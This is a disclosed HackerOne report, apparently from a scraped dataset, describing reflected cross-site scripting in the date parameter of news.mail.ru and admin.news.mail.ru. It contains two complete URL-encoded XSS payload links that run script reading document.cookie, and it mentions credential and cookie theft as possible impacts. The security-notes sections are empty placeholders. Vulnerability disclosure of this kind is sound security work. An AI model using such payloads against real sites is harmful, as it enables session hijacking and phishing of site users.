---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '94517'
original_report_id: '94517'
title: Reflective Xss on news.mail.ru and admin.news.mail.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-10-18T21:26:39.638Z'
disclosed_at: '2015-12-11T10:53:33.774Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflective Xss on news.mail.ru and admin.news.mail.ru

## Metadata

- HackerOne Report ID: 94517
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-12-11T10:53:33.774Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello folks I know this is out of scope for a bounty but I thought I'd report it anyway.
The XSS appears in the date parameter and there are two examples below.

https://news.mail.ru/currency.html?date=%22%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Eprompt%28document.domain,document.cookie%29%3C/script%3E

https://admin.news.mail.ru/currency.html?date=%22%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Eprompt%28document.domain,document.cookie%29%3C/script%3E

This can be used to display false information, including fake news articles or a fake login panel to steal credentials. It may also be possible to steal session cookies.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
